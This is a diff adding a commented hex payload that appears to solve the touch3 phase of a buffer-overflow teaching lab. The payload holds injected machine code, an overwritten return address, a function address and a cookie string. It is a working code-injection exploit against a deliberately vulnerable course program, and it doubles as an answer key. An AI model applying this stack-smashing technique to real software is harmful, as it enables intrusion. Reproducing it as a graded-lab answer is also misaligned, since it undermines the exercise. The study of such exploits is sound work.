@@ -1,0 +1,6 @@
+00 00 00 00 00 00 00 00
+48 c7 c7 10 89 67 55 c3 /* Injected code; mov 0x55678910, %rdi */
+00 00 00 00 00 00 00 00
+f0 88 67 55 00 00 00 00 /* address of injected code (found through looking at %rsp after allocating for getbuf) (0x556788f0) */
+f9 13 40 00 00 00 00 00 /* address of touch3 */
+37 38 33 63 64 32 64 64 /* cookie val as a string */
